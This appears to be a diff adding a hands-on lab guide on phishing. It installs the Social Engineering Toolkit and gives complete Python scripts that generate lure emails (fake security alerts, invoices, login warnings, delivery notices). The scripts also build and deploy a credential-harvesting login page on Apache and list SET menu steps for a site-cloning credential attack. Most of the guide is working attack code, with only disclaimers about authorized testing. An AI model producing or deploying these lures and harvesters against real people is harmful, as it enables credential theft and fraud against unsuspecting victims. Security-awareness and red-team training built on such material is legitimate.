@@ -1,0 +1,583 @@
+Generate AI-Based Phishing Lures with SET + LLM Prompts
+Learning Objectives
+By completing this lab, you will:
+
+Configure and deploy the Social Engineering Toolkit (SET) for phishing campaigns
+Integrate Large Language Model (LLM) prompts to generate convincing phishing content
+Automate the creation of AI-enhanced phishing lures for security testing
+Understand the intersection of AI and social engineering attack vectors
+Prerequisites
+Basic Linux command-line knowledge
+Understanding of social engineering concepts
+Familiarity with web technologies (HTML, HTTP)
+Python programming fundamentals
+Important: This lab is for educational and authorized security testing only
+Lab Environment
+Al Nafi provides Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated environment. The provided Linux machine is bare metal with no pre-installed tools, so you will install all required components during the lab.
+
+Task 1: Set up SET for Social Engineering Attacks
+Subtask 1.1: Install Required Dependencies
+Update the system and install essential packages:
+
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y git python3 python3-pip apache2 openssl
+sudo systemctl enable apache2
+sudo systemctl start apache2
+Subtask 1.2: Install Social Engineering Toolkit
+Clone and install SET:
+
+cd /opt
+sudo git clone https://github.com/trustedsec/social-engineer-toolkit.git setoolkit
+cd setoolkit
+sudo pip3 install -r requirements.txt
+sudo python3 setup.py install
+Subtask 1.3: Configure SET
+Create SET configuration directory and run initial setup:
+
+sudo mkdir -p /etc/setoolkit
+sudo cp config/set_config /etc/setoolkit/
+sudo chmod +x setoolkit
+Test SET installation:
+
+sudo python3 setoolkit
+Exit SET by typing 99 and pressing Enter.
+
+Task 2: Integrate LLM Prompts for Content Generation
+Subtask 2.1: Install OpenAI Python Library
+Install the OpenAI library for LLM integration:
+
+pip3 install openai requests beautifulsoup4
+Subtask 2.2: Create AI Content Generator Script
+Create a Python script to generate phishing content:
+
+nano ai_phishing_generator.py
+Add the following code:
+
+#!/usr/bin/env python3
+import openai
+import json
+import sys
+import os
+from datetime import datetime
+
+class PhishingContentGenerator:
+    def __init__(self):
+        # Using a local LLM endpoint or mock for educational purposes
+        self.base_prompts = {
+            "urgent_security": "Create an urgent security alert email that appears to be from IT department requiring immediate password reset",
+            "invoice_scam": "Generate a fake invoice email from a well-known service requesting payment verification",
+            "social_media": "Create a social media notification about suspicious account activity",
+            "package_delivery": "Generate a package delivery notification requiring address confirmation"
+        }
+    
+    def generate_content(self, prompt_type, target_company="TechCorp", target_name="User"):
+        """Generate phishing content based on prompt type"""
+        if prompt_type not in self.base_prompts:
+            return None
+        
+        # Simulate AI-generated content (replace with actual LLM API call)
+        templates = {
+            "urgent_security": f"""
+Subject: URGENT: Security Alert for {target_name}
+
+Dear {target_name},
+
+Our security systems have detected unusual activity on your {target_company} account. 
+To protect your account, please verify your credentials immediately.
+
+Click here to secure your account: [MALICIOUS_LINK]
+
+This link will expire in 24 hours.
+
+Best regards,
+{target_company} Security Team
+            """,
+            "invoice_scam": f"""
+Subject: Invoice #INV-{datetime.now().strftime('%Y%m%d')} - Payment Required
+
+Dear {target_name},
+
+Your recent purchase requires payment verification. Please review the attached invoice.
+
+Amount Due: $299.99
+Due Date: {datetime.now().strftime('%Y-%m-%d')}
+
+Verify Payment: [MALICIOUS_LINK]
+
+{target_company} Billing Department
+            """,
+            "social_media": f"""
+Subject: Suspicious Login Detected
+
+Hi {target_name},
+
+We detected a login to your account from an unrecognized device.
+
+Location: Unknown
+Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}
+
+If this wasn't you, secure your account: [MALICIOUS_LINK]
+
+Social Media Security Team
+            """,
+            "package_delivery": f"""
+Subject: Package Delivery Attempt Failed
+
+Dear {target_name},
+
+We attempted to deliver your package but need to confirm your address.
+
+Tracking: PKG{datetime.now().strftime('%Y%m%d')}123
+Delivery Company: FastShip Express
+
+Update delivery address: [MALICIOUS_LINK]
+
+FastShip Customer Service
+            """
+        }
+        
+        return templates.get(prompt_type, "")
+    
+    def save_content(self, content, filename):
+        """Save generated content to file"""
+        with open(filename, 'w') as f:
+            f.write(content)
+        print(f"Content saved to {filename}")
+
+def main():
+    generator = PhishingContentGenerator()
+    
+    print("AI-Based Phishing Content Generator")
+    print("Available prompt types:")
+    for key in generator.base_prompts.keys():
+        print(f"- {key}")
+    
+    prompt_type = input("\nEnter prompt type: ").strip()
+    target_company = input("Enter target company (default: TechCorp): ").strip() or "TechCorp"
+    target_name = input("Enter target name (default: User): ").strip() or "User"
+    
+    content = generator.generate_content(prompt_type, target_company, target_name)
+    
+    if content:
+        filename = f"phishing_{prompt_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        generator.save_content(content, filename)
+        print(f"\nGenerated content:\n{content}")
+    else:
+        print("Invalid prompt type!")
+
+if __name__ == "__main__":
+    main()
+Make the script executable:
+
+chmod +x ai_phishing_generator.py
+Subtask 2.3: Test Content Generation
+Run the content generator:
+
+python3 ai_phishing_generator.py
+Test with different prompt types and save the generated content.
+
+Task 3: Automate Phishing Lure Creation
+Subtask 3.1: Create SET Integration Script
+Create an automation script that combines AI content with SET:
+
+nano automated_phishing_setup.py
+Add the following code:
+
+#!/usr/bin/env python3
+import os
+import sys
+import subprocess
+import json
+from datetime import datetime
+
+class AutomatedPhishingSetup:
+    def __init__(self):
+        self.set_path = "/opt/setoolkit"
+        self.web_root = "/var/www/html"
+        self.templates_dir = "phishing_templates"
+        
+    def create_template_directory(self):
+        """Create directory for phishing templates"""
+        if not os.path.exists(self.templates_dir):
+            os.makedirs(self.templates_dir)
+            print(f"Created template directory: {self.templates_dir}")
+    
+    def generate_html_template(self, content, template_name):
+        """Convert text content to HTML template"""
+        html_content = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Alert</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; margin: 40px; }}
+        .container {{ max-width: 600px; margin: 0 auto; }}
+        .alert {{ background-color: #f8d7da; border: 1px solid #f5c6cb; 
+                 color: #721c24; padding: 15px; border-radius: 5px; }}
+        .button {{ background-color: #007bff; color: white; padding: 10px 20px; 
+                  text-decoration: none; border-radius: 5px; display: inline-block; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="alert">
+            <h2>Security Alert</h2>
+            <pre>{content}</pre>
+            <br>
+            <a href="credential_harvester.html" class="button">Verify Account</a>
+        </div>
+    </div>
+</body>
+</html>
+        """
+        
+        template_path = os.path.join(self.templates_dir, f"{template_name}.html")
+        with open(template_path, 'w') as f:
+            f.write(html_content)
+        
+        print(f"HTML template created: {template_path}")
+        return template_path
+    
+    def create_credential_harvester(self):
+        """Create credential harvesting page"""
+        harvester_html = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
+        .container { max-width: 400px; margin: 0 auto; background: white; 
+                    padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; 
+                                                    border: 1px solid #ddd; border-radius: 5px; }
+        .submit-btn { background-color: #007bff; color: white; padding: 12px 30px; 
+                     border: none; border-radius: 5px; cursor: pointer; width: 100%; }
+        .submit-btn:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Account Verification Required</h2>
+        <p>Please enter your credentials to verify your account:</p>
+        
+        <form action="process_credentials.php" method="POST">
+            <div class="form-group">
+                <label for="username">Username/Email:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="submit-btn">Verify Account</button>
+        </form>
+    </div>
+    
+    <script>
+        // Log credentials (for demonstration - in real scenario, this would send to attacker)
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            console.log('Captured credentials:', {username, password});
+            alert('Account verified successfully! (This is a simulation)');
+        });
+    </script>
+</body>
+</html>
+        """
+        
+        harvester_path = os.path.join(self.templates_dir, "credential_harvester.html")
+        with open(harvester_path, 'w') as f:
+            f.write(harvester_html)
+        
+        print(f"Credential harvester created: {harvester_path}")
+        return harvester_path
+    
+    def deploy_to_webserver(self, template_path):
+        """Deploy template to Apache web server"""
+        try:
+            # Copy template to web root
+            subprocess.run(['sudo', 'cp', template_path, self.web_root], check=True)
+            subprocess.run(['sudo', 'cp', os.path.join(self.templates_dir, "credential_harvester.html"), 
+                          self.web_root], check=True)
+            
+            # Set proper permissions
+            subprocess.run(['sudo', 'chown', 'www-data:www-data', 
+                          os.path.join(self.web_root, os.path.basename(template_path))], check=True)
+            subprocess.run(['sudo', 'chown', 'www-data:www-data', 
+                          os.path.join(self.web_root, "credential_harvester.html")], check=True)
+            
+            print(f"Template deployed to web server")
+            print(f"Access at: http://localhost/{os.path.basename(template_path)}")
+            
+        except subprocess.CalledProcessError as e:
+            print(f"Error deploying to web server: {e}")
+    
+    def create_set_config(self, template_name):
+        """Create SET configuration for automated attack"""
+        config = {
+            "attack_type": "website_attack",
+            "template": template_name,
+            "port": "80",
+            "ip": "127.0.0.1"
+        }
+        
+        config_path = os.path.join(self.templates_dir, f"{template_name}_config.json")
+        with open(config_path, 'w') as f:
+            json.dump(config, f, indent=2)
+        
+        print(f"SET configuration created: {config_path}")
+        return config_path
+
+def main():
+    setup = AutomatedPhishingSetup()
+    setup.create_template_directory()
+    
+    print("Automated Phishing Setup")
+    print("1. Generate AI content first using ai_phishing_generator.py")
+    
+    content_file = input("Enter path to generated content file: ").strip()
+    
+    if not os.path.exists(content_file):
+        print("Content file not found!")
+        return
+    
+    with open(content_file, 'r') as f:
+        content = f.read()
+    
+    template_name = input("Enter template name: ").strip()
+    
+    # Create HTML template
+    template_path = setup.generate_html_template(content, template_name)
+    
+    # Create credential harvester
+    setup.create_credential_harvester()
+    
+    # Deploy to web server
+    setup.deploy_to_webserver(template_path)
+    
+    # Create SET configuration
+    setup.create_set_config(template_name)
+    
+    print("\nAutomated phishing setup complete!")
+    print("Next steps:")
+    print("1. Test the phishing page in a browser")
+    print("2. Use SET for advanced social engineering attacks")
+    print("3. Monitor and analyze results (in authorized testing only)")
+
+if __name__ == "__main__":
+    main()
+Make the script executable:
+
+chmod +x automated_phishing_setup.py
+Subtask 3.2: Create Complete Automation Workflow
+Create a master script that combines all components:
+
+nano complete_phishing_automation.py
+Add the following code:
+
+#!/usr/bin/env python3
+import os
+import sys
+import subprocess
+import time
+
+def run_command(command, description):
+    """Run a command and handle errors"""
+    print(f"\n[INFO] {description}")
+    try:
+        result = subprocess.run(command, shell=True, check=True, 
+                              capture_output=True, text=True)
+        if result.stdout:
+            print(result.stdout)
+        return True
+    except subprocess.CalledProcessError as e:
+        print(f"[ERROR] {description} failed: {e}")
+        if e.stderr:
+            print(f"Error details: {e.stderr}")
+        return False
+
+def main():
+    print("Complete AI-Based Phishing Automation")
+    print("=" * 50)
+    
+    # Step 1: Generate AI content
+    print("\nStep 1: Generating AI-based phishing content...")
+    
+    # Create automated content generation
+    prompt_types = ["urgent_security", "invoice_scam", "social_media", "package_delivery"]
+    
+    print("Available prompt types:")
+    for i, ptype in enumerate(prompt_types, 1):
+        print(f"{i}. {ptype}")
+    
+    choice = input("\nSelect prompt type (1-4): ").strip()
+    
+    try:
+        selected_type = prompt_types[int(choice) - 1]
+    except (ValueError, IndexError):
+        print("Invalid choice!")
+        return
+    
+    target_company = input("Enter target company: ").strip() or "TechCorp"
+    target_name = input("Enter target name: ").strip() or "User"
+    
+    # Generate content automatically
+    content_script = f"""
+from ai_phishing_generator import PhishingContentGenerator
+from datetime import datetime
+
+generator = PhishingContentGenerator()
+content = generator.generate_content('{selected_type}', '{target_company}', '{target_name}')
+filename = f'auto_phishing_{selected_type}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
+generator.save_content(content, filename)
+print(f'CONTENT_FILE:{filename}')
+"""
+    
+    with open('temp_generate.py', 'w') as f:
+        f.write(content_script)
+    
+    result = subprocess.run(['python3', 'temp_generate.py'], 
+                          capture_output=True, text=True)
+    
+    if result.returncode == 0:
+        # Extract filename from output
+        for line in result.stdout.split('\n'):
+            if line.startswith('CONTENT_FILE:'):
+                content_file = line.split(':', 1)[1]
+                break
+        else:
+            print("Failed to generate content!")
+            return
+    else:
+        print("Content generation failed!")
+        return
+    
+    # Step 2: Create phishing templates
+    print(f"\nStep 2: Creating phishing templates from {content_file}...")
+    
+    template_name = f"phishing_{selected_type}_{int(time.time())}"
+    
+    setup_script = f"""
+from automated_phishing_setup import AutomatedPhishingSetup
+import os
+
+setup = AutomatedPhishingSetup()
+setup.create_template_directory()
+
+with open('{content_file}', 'r') as f:
+    content = f.read()
+
+template_path = setup.generate_html_template(content, '{template_name}')
+setup.create_credential_harvester()
+setup.deploy_to_webserver(template_path)
+setup.create_set_config('{template_name}')
+print('TEMPLATE_READY')
+"""
+    
+    with open('temp_setup.py', 'w') as f:
+        f.write(setup_script)
+    
+    if run_command('python3 temp_setup.py', 'Creating phishing templates'):
+        print(f"\nPhishing campaign ready!")
+        print(f"Template name: {template_name}")
+        print(f"Web interface: http://localhost/{template_name}.html")
+        
+        # Step 3: Display SET integration instructions
+        print("\nStep 3: SET Integration Instructions")
+        print("-" * 40)
+        print("To use with SET:")
+        print("1. Run: sudo python3 /opt/setoolkit/setoolkit")
+        print("2. Select: 1) Social-Engineering Attacks")
+        print("3. Select: 2) Website Attack Vectors")
+        print("4. Select: 3) Credential Harvester Attack Method")
+        print("5. Select: 2) Site Cloner")
+        print(f"6. Use template: {template_name}.html")
+        
+        # Step 4: Test the setup
+        print("\nStep 4: Testing the setup...")
+        if run_command('curl -s http://localhost/ > /dev/null', 'Testing web server'):
+            print("Web server is running successfully!")
+        
+        print("\nStep 5: Cleanup temporary files...")
+        for temp_file in ['temp_generate.py', 'temp_setup.py']:
+            if os.path.exists(temp_file):
+                os.remove(temp_file)
+        
+        print("\n" + "=" * 50)
+        print("AUTOMATION COMPLETE!")
+        print("=" * 50)
+        print(f"Phishing lure generated: {content_file}")
+        print(f"HTML template: {template_name}.html")
+        print(f"Access URL: http://localhost/{template_name}.html")
+        print("\nRemember: Use only for authorized security testing!")
+    
+    else:
+        print("Template creation failed!")
+
+if __name__ == "__main__":
+    main()
+Make the script executable:
+
+chmod +x complete_phishing_automation.py
+Subtask 3.3: Test the Complete Automation
+Run the complete automation workflow:
+
+python3 complete_phishing_automation.py
+Follow the prompts to:
+
+Select a phishing prompt type
+Enter target information
+Generate and deploy the phishing lure
+Test the web interface
+Subtask 3.4: Verify the Phishing Setup
+Test the generated phishing page:
+
+# Check if web server is running
+sudo systemctl status apache2
+
+# Test the phishing page
+curl -I http://localhost/
+
+# List generated files
+ls -la phishing_templates/
+Open a web browser and navigate to http://localhost/[template_name].html to see the generated phishing page.
+
+Verification and Testing
+Test the AI Content Generation
+# Generate different types of content
+python3 ai_phishing_generator.py
+
+# Verify generated files
+ls -la *.txt
+Test the Web Interface
+# Check Apache status
+sudo systemctl status apache2
+
+# Test web accessibility
+curl -s http://localhost/ | head -10
+Verify SET Integration
+# Check SET installation
+cd /opt/setoolkit
+sudo python3 setoolkit --help
+Important Security Notes
+Authorization Required: Only use these techniques on systems you own or have explicit permission to test
+Educational Purpose: This lab is designed for learning defensive security measures
+Legal Compliance: Ensure all activities comply with local laws and regulations
+Ethical Use: Use knowledge gained to improve organizational security posture
+Conclusion
+You have successfully completed Lab 14, where you:
+
+Configured SET for social engineering attack simulations
+Integrated AI-generated content to create convincing phishing lures
+Automated the entire process from content generation to deployment
+Created a complete phishing testing framework using open-source tools
+This lab demonstrates how AI can be leveraged by both attackers and defenders in cybersecurity. Understanding these techniques helps security professionals better defend against sophisticated social engineering attacks that increasingly use AI-generated content. The automation framework you built can be used for authorized penetration testing and security awareness training programs.
+
+Key Takeaway: As AI becomes more accessible, the quality and scale of social engineering attacks will increase, making user education and technical defenses more critical than ever.
